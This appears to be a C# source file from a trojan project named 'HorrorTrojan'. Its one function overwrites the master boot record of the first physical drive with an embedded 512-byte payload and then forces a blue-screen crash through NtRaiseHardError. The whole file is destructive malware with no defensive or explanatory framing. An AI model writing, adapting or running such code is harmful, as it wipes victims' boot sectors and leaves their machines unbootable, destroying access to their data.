using System;
using System.IO;

namespace HorrorTrojan
{
    internal static class BSODTrigger
    {
        public static void TriggerBSOD()
        {
            byte[] mbr = ResourceExtractor.GetMBR();
            if (mbr.Length == 512)
            {
                try
                {
                    using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                    {
                        fs.Write(mbr, 0, 512);
                        fs.Flush();
                    }
                }
                catch { }
            }
            
            uint response;
            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
        }
    }
}
